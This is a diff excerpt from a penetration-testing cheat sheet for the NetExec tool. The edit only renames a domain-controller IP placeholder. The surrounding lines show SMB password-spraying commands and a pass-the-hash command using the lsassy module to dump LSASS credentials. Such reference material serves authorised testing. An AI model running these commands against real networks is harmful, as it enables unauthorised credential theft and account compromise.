@@ -208,7 +208,7 @@ nxc smb <ip> --local-auth -u <user> -H <nt_hash> -M lsassy -o BLOODHOUND=True NE
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 
 
 ```bash
-nxc smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
+nxc smb <dc_ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
 ```
 
 ## password spray multiple test 
@@ -217,7 +217,7 @@ nxc smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-su
 (carrefull on lockout)
 
 ```bash
-nxc smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
+nxc smb <dc_ip> -u <user.txt> -p <password.txt> --continue-on-success
 ```
 
 ## put file
